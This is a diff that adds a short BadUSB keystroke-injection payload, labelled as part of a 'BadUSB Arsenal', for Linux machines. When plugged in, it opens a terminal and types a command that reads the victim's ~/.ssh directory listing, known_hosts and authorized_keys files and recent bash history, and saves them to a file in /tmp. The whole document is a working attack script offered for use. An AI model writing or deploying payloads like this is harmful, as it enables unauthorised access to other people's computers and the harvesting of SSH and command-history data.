@@ -1,0 +1,7 @@
+REM Linux SSH Keys and History Inventory
+REM Hard-Tools BadUSB Arsenal
+DELAY 1000
+CTRL ALT t
+DELAY 800
+STRING (echo "=== SSH DIRECTORY ==="; ls -la ~/.ssh/ 2>/dev/null; echo "=== KNOWN HOSTS ==="; cat ~/.ssh/known_hosts 2>/dev/null; echo "=== AUTHORIZED KEYS ==="; cat ~/.ssh/authorized_keys 2>/dev/null; echo "=== RECENT BASH COMMANDS ==="; tail -n 25 ~/.bash_history 2>/dev/null) > /tmp/ssh_inventory.txt && head -n 30 /tmp/ssh_inventory.txt
+ENTER
